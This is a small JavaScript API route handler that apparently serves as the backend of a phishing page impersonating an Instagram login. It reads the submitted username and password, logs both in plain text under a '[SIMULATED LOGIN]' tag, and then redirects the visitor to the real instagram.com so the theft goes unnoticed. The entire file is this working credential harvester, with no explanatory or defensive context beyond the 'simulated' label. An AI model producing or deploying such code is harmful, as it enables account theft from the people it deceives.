export default function handler(req, res) {
  if (req.method === "POST") {
    const { username, password } = req.body
    console.log(`[SIMULATED LOGIN] Username: ${username} | Password: ${password}`)
  }
  res.redirect("https://instagram.com")
}
